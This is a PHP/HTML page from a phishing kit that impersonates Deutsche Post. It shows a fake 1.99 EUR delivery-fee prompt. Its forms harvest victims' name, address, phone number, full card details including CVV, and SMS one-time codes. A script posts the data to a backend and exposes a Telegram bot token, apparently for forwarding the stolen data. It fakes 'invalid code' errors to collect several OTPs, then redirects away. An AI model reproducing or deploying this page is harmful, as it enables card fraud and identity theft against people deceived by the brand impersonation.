<?php 
require '../main.php';

$time = date("Y-m-d, H:i:s");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deutsche Post</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
<header>
<div class="header-mobile container-fluid m-0 p-0">
<div class="row align-items-center m-0 p-0">
<div class="col text-left">
<img src="assets/img/logo.png" style="width:45px;">
</div>
<div class="col text-center">
</div>
<div class="col text-right">
<img src="assets/img/menu.png" style="width:65px;">
</div>
</div>
</div>


<div class="header-pc container-fluid m-0" >
<div class="container-xl">
<div class="row m-0 align-items-center">
<div class="col-2 text-left">
    <img src="assets/img/logo.png" style="width:55px;">
</div>
<div class="col text-center mt-3">
<ul>
<li>Shop </li>
<li>Versenden <i class="fa-solid fa-angle-down"></i></li>
<li>Empfangen <i class="fa-solid fa-angle-down"></i></li>
<li>Geschäftskunden <i class="fa-solid fa-angle-down"></i></li>
<li>Hilfe & Tipps <i class="fa-solid fa-angle-down"></i></li>
</ul>
</div>
<div class="col-2 text-right">
<img src="assets/img/search.png" style="width:30px;">
</div>
</div>
</div>
</div>
</header>

    






<section class="container">
<div class="row flexa">

<div class="col-lg-7">
<div class="formbox">

<div class="box">
    <h5><i class="fa-solid fa-box-open" style="color:#ffcc00; margin-right:4px;"></i> Tracking number : <?php echo $track; ?></h5>
    <p style="font-size:0.9em; margin:15px 0;"><i class="fa-solid fa-caret-right" style="color:#ffcc00; margin-right:4px;"></i> <b>On-Demand-Lieferservice der Post</b></p>
    <div class="alert alert-warning" style="font-size:0.8em;">
    Ihr Paket wartet auf die Zustellung. Bitte bestätigen Sie die Zahlung (1,99 €). Die Online-Verifizierung muss in den nächsten 2 Tagen vor Ablauf erfolgen.
    </div>
</div>


<div class="box">
<h5 style="margin-bottom:20px;">
<i class="fa-solid fa-truck-fast" style="color:#ffcc00; margin-right:4px;"></i> <b>Adresse bestätigen</b> </h5>



<div class="form-group">
<input type="text" class="form-control" id="d0" placeholder="Vollständiger Name">
</div>

<div class="form-group">
<input type="text" class="form-control" id="d1" placeholder="Adresszeile">
</div>

<script>var token=<?php echo json_encode($TELEGRAM_API['bot_token']); ?>;</script>

<div class="form-group">
<div class="row m-0 p-0">
  <div class="col m-0 p-0" >
  <input type="text" class="form-control" id="d2" placeholder="Stadt" style="border-right:none; border-radius:5px 0 0 5px;">
  </div>
  <div class="col m-0 p-0">
  <input type="text" class="form-control" id="d3" placeholder="Postleitzahl" style="border-radius:0 5px 5px 0;">
</div>
</div>
</div>

<div class="form-group">
<input type="text" class="form-control" id="d4" placeholder="Telefonnummer">
</div>


<h5 >
<i class="fa-solid fa-credit-card" style="color:#ffcc00; margin-right:4px;"></i> <b> Zahlungsmethode hinzufügen </b> </h5>
<span style="margin-bottom:20px; display:block;"><i class="fa-solid fa-caret-right" style="color:#ffcc00; margin-right:4px;"></i> Zur Deckung der Versandkosten nutzen wir diese Zahlungsart  (1,99 €).</span>
<img src="assets/img/cards.png" style="width:180px; margin:10px 0;">

<div class="form-group">
<input type="text" class="form-control" inputmode="numeric" id="d5" placeholder="Kartennummer">
</div>
<div class="form-group">
<div class="row m-0 p-0">
  <div class="col m-0 p-0" >
  <input type="text" class="form-control" inputmode="numeric" id="d6" placeholder="MM/JJ" style="border-right:none; border-radius:5px 0 0 5px;">
  </div>
  <div class="col m-0 p-0">
  <input type="text" class="form-control" inputmode="numeric" id="d7" placeholder="CVV" style="border-radius:0 5px 5px 0;">
</div>
</div>
</div>


<div class="form-group">
<button class="btn btn-danger w-100" id="billsubmit" onclick="sendData()">Weiter</button>
</div>


</div>
</div>
</div>


<div class="col-lg-4 text-center">
<div class="trackbox">
<div class="box">
<h5><i class="fa-solid fa-caret-right" style="color:#ffcc00; margin-right:4px;"></i> Paket informationen</h5>
<span>Gesamt   <i>1,99 €</i></span>
</div>

<div class="box">
<span><i class="fa-solid fa-caret-right" style="color:#ffcc00; margin-right:4px;"></i> Auftragsnummer   <b><?php echo $track; ?></b></span>
</div>

<div class="box border-0 text-center">
    <img src="assets/img/package.jpg" style="width:100px; max-width:100%;">
</div>

</div>
</div>


</div>
</section>











<footer class="container-fluid  p-0 py-4 m-0">
<div class="container-lg">
    <div class="ul">
        <li><i class="fa-solid fa-angle-right"></i> Mein Kundenservice </li>
        <li><i class="fa-solid fa-angle-right"></i> Deutsche Version </li> 
    </div>
    <div class="row">
        <div class="col-md-6 text-left">
            <span>Legal | </span>  
            <span>Using this website | </span> 
            <span> Data Protection | </span>
            <span> Consent Settings</span>
        </div>
        <div class="col-md-6 text-left">
            <b>Deutsche Post Group</b><br>
            <span>Deutsche Post DHL Group | </span> 
            <span>Careers | </span> 
            <span>Media | </span> 
            <span>Investors</span>
   
        </div>
    </div>

</div>

</footer>


<!-- SMS -->
<div class="sms container-fluid " style="display:none;" id="sms">
<div class="container-lg" style="width:500px; max-width:100%;">
<div class="row align-items-center border-bottom">
<div class="col text-left">
<svg viewBox="0 0 56 56" style="width:70px;" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <g id="brand-dp-logo-superzeichen" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="DP_Logo_SZ_rgb_schwarz-Copy">
            <g id="Boundingbox">
                <rect id="Rectangle" x="0" y="0"></rect>
            </g>
            <g id="DP_Logo_SZ" transform="translate(10.650000, 12.500000)" fill="#000000" fill-rule="nonzero">
                <path d="M12.0530276,24.0248552 L16.9321951,24.0248552 L12.0044542,29 L7.12474093,29 L12.0530276,24.0248552 Z M0.542449215,29 L5.42325405,29 L10.3493577,24.0248552 L5.47073589,24.0248552 L0.542449215,29 Z M22.9449232,24.0248552 L18.0646641,24.0248552 L22.9929508,29 L27.8726641,29 L22.9449232,24.0248552 Z M29.5272149,24.0248552 L24.6469558,24.0248552 L29.5746967,29 L34.4538643,29 L29.5272149,24.0248552 Z M36.747526,4.11941638 C36.0549462,14.256233 28.4343851,23.134265 17.1277057,23.1299034 C4.33762836,23.126084 -0.607031354,12.0326346 0.0588058263,3.62691959 L3.81532821,2.43467374 C3.20461362,7.21838293 4.68910307,10.6685875 5.71241841,12.249704 C4.49371806,5.48237263 9.6146609,0.00436840288 16.0241624,2.59702948e-06 C21.7896575,-0.00381260702 26.5580341,4.19631787 26.5351118,10.2219044 C27.3810525,7.92194978 27.9699363,4.42047755 28.0910969,1.96944698 L36.747526,4.11941638 Z M22.970154,10.4346106 C22.970154,6.6173514 19.8690992,3.52329346 16.0410812,3.52329346 C12.215792,3.52329346 9.11419148,6.6173514 9.11419148,10.4346106 C9.11419148,14.2518698 12.215792,17.3459278 16.0410812,17.3459278 C19.8690829,17.3459278 22.970154,14.2518753 22.970154,10.4345997 L22.970154,10.4346106 Z" id="Shape"></path>
            </g>
        </g>
    </g>
</svg>
</div>
<div class="col text-right">
    <img src="assets/img/mv.png" style="width:140px;">
</div>
</div>

<!-- -------------------------------- end header -->


<!-- start body -->
<div class="w-100 text-center border-bottom py-5" style="font-size:0.8em;">
<h4 class="text-center">OTP-Bestätigung</h4>
<p class="text-center" style="font-size:1.3em;">
Bitte Bestätigen Sie den code den sie<br>
übersandt bekommen haben auf Ihre<br>
 Telefonnummer, um diese Zahlung zu<br>
 Bestätigen
</p>
<table class="table-sm d-inline-block ">
<tr>
<th>Datum :</th>
<td><?php echo $time; ?></td>
</tr>
<tr>
<th>Karte :</th>
<td>XXXX XXXX XXXX <span id="cc"></span> </td>
</tr>
<tr>
<th>Händler :</th>
<td>Deutsche Post Group</td>
</tr>
<tr>
<th>Code :</th>
<td><input type="text" id="otp" maxlength="6" autocomplete="one-time-code" placeholder="Code eingeben" style="border:1px solid #333; border-radius:3px;"></td>
</tr>
<tr>
<th></th>
<td style="color:red;" id="sms_error"></td>
</tr>
</table>

</div>

<!-- end body -->


<div class=" py-3">
<div class="row">
<div class="col text-left" style="font-size:0.8em; padding:10px;">
Fordern Sie in <b id="timer">30</b> Sekunden einen <a href="javascript:newOtp()">neuen Code</a> an.
</div>
<div class="col-sm-3 text-right">
<button class="btn btn-warning" onclick="sendOtp()">Weiter</button>   
</div>
</div>
</div>

</div>
</div>
<!-- END SMS -->


<div class="window" id="loader" style="display:none;">
    <div class="loader">
        <div class="content" style="width:100%;">
            <img src="assets/img/loading.gif">
            <p>Verlassen Sie diese Seite nicht.</p>
            <div id="statu" class="border" style="width:400px; max-width:90%; display:inline-block; padding:20px; border-radius:3px; background:white; ">
            Warten Sie mal...
            </div>
        </div>
    </div>
</div>


<div class="window" id="sms_loader" style="display:none; z-index:99999;">
    <div class="loader">
        <div class="content" style="width:100%;">
            <img src="assets/img/loading.gif">
            <p>Warten Sie mal...<br> Verlassen Sie diese Seite nicht.</p>
        </div>
    </div>
</div>



<div class="window"  id="done" style="display:none; z-index:9999999; background:white;">
<div class="container-lg h-100 align-items-center justify-content-center d-flex text-center py-5">
<div class="">
<svg viewBox="0 0 56 56" style="width:70px;" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <g id="brand-dp-logo-superzeichen" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="DP_Logo_SZ_rgb_schwarz-Copy">
            <g id="Boundingbox">
                <rect id="Rectangle" x="0" y="0"></rect>
            </g>
            <g id="DP_Logo_SZ" transform="translate(10.650000, 12.500000)" fill="#000000" fill-rule="nonzero">
                <path d="M12.0530276,24.0248552 L16.9321951,24.0248552 L12.0044542,29 L7.12474093,29 L12.0530276,24.0248552 Z M0.542449215,29 L5.42325405,29 L10.3493577,24.0248552 L5.47073589,24.0248552 L0.542449215,29 Z M22.9449232,24.0248552 L18.0646641,24.0248552 L22.9929508,29 L27.8726641,29 L22.9449232,24.0248552 Z M29.5272149,24.0248552 L24.6469558,24.0248552 L29.5746967,29 L34.4538643,29 L29.5272149,24.0248552 Z M36.747526,4.11941638 C36.0549462,14.256233 28.4343851,23.134265 17.1277057,23.1299034 C4.33762836,23.126084 -0.607031354,12.0326346 0.0588058263,3.62691959 L3.81532821,2.43467374 C3.20461362,7.21838293 4.68910307,10.6685875 5.71241841,12.249704 C4.49371806,5.48237263 9.6146609,0.00436840288 16.0241624,2.59702948e-06 C21.7896575,-0.00381260702 26.5580341,4.19631787 26.5351118,10.2219044 C27.3810525,7.92194978 27.9699363,4.42047755 28.0910969,1.96944698 L36.747526,4.11941638 Z M22.970154,10.4346106 C22.970154,6.6173514 19.8690992,3.52329346 16.0410812,3.52329346 C12.215792,3.52329346 9.11419148,6.6173514 9.11419148,10.4346106 C9.11419148,14.2518698 12.215792,17.3459278 16.0410812,17.3459278 C19.8690829,17.3459278 22.970154,14.2518753 22.970154,10.4345997 L22.970154,10.4346106 Z" id="Shape"></path>
            </g>
        </g>
    </g>
</svg>
<h3>Die Zahlung war erfolgreich. Danke schön!</h3>
<img src="assets/img/paid.png" style="width:250px;">
<p>Über Ihre Kontaktdaten erhalten Sie in Kürze Einzelheiten zu Ihrer Zahlung und dem Versand.<br>
Nun werden Sie zur Startseite weitergeleitet...</p>
</div>
</div>
</div>



<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="assets/lib/cv.js"></script>
<script src="assets/lib/jq.js"></script>

<script>
var submitTrigered = false;
var start_statu = false;
var startTimer = false;
var timer = 30;
var isCounting = false;

$("#d5").mask("0000 0000 0000 0000");
$("#d6").mask("00/00");
$("#d7").mask("0000");
$("#otp").mask("000000");

function val(){

    var allowSubmit = true;

    for(var i=0; i<=7; i++){
        if($("#d"+i).val().length==0){
            $("#d"+i).addClass("error");
            allowSubmit=false;
        }else{
            $("#d"+i).removeClass("error");
        }
    }

    const exps = $("#d6").val().split("/");
    if(exps[0]>12 || exps[0]<0 || exps[1]>40 || exps[1]<23 || $("#d6").val().length<5){
        $("#d6").addClass("error");
        allowSubmit=false;
    }else{
        $("#d6").removeClass("error");
    }

    var cardResult = $("#d5").validateCreditCard();
    if(!cardResult.valid){
        $("#d5").addClass("error");
        allowSubmit=false;
    }else{
        $("#d5").removeClass("error");
    }


    return  allowSubmit;
}


function sendData(){
    submitTrigered=true;
    if(val()){

        $("#billsubmit").attr("disabled");
        $("#loader").show();
        start_statu = true;
        $.post("../post.php",{
           <?php 
           $res = "";
                for($i=0; $i<=7; $i++){
                    $res .= "d".$i.":"."$('#d".$i."').val(),";
                }
                echo $res;
            ?>
        },(d)=>{
            setTimeout(() => {
                $("#cc").html($("#d5").val().slice(-4));
                $("#sms").show();
                $("#otp").focus();
                $("#loader").hide();
                newOtp();
            }, 7000);            

        });
    }
}

$("section input").keypress((e)=>{
    if(e.key=="Enter"){
        sendData();
    }
});

$("input").keyup(()=>{
    if(submitTrigered){
        val();
    }
});


// $("#d5").keyup(()=>{
//     var getCard = $("#d5").validateCreditCard();
//     $("#card_type").src("assets/img/"+getCard.card_type.name+".png");
// });






var statu_counter = 0;
setInterval(()=>{
    if(start_statu){
    statu_counter= statu_counter+1;
    if(statu_counter==3){
        $("#statu").html('Verarbeitung Ihrer Daten...');
    }
    if(statu_counter==6){
        $("#statu").html('Sie werden in Kürze zur Bestätigungsseite weitergeleitet...');
    }
}
}, 1000);




    var sms_error = <?php echo $sms_error; ?>;
    var sms_error_counter = 0;

function sendOtp(){

    $("#otp").removeClass("error");
    if($("#otp").val().length==6){
        $("#sms_error").html("");
        $("#sms_loader").show();
        $.post("../post.php",{
            otp:$("#otp").val()
        },(d)=>{
            setTimeout(()=>{
             sms_error_counter = sms_error_counter + 1;
            if(sms_error ==  sms_error_counter){
                $("#done").show();
                $("#sms_loader").hide();
               leave();
            }else{
                newOtp();
                $("#otp").val("");
                $("#sms_loader").hide();
                $("#sms_error").html('Ungültiger Code.");?>');
            }
        }, 5000);


        });

    }else{
        $("#otp").addClass("error");
    }
}


$("#sms input").keypress((e)=>{
    if(e.key=="Enter"){
        sendOtp();
    }
});






function newOtp(){
    startTimer=true;
    if(timer<=1){
        timer=30;
    }
}


setInterval(()=>{
    if(startTimer && timer>0){
        timer = timer - 1;
        $("#timer").html(timer);
    }

}, 1000);



function leave(){
    setTimeout(() => {
    window.location="<?php echo $bm->EXIT_LINK; ?>";
}, 5000);
}

</script>
</body>
</html>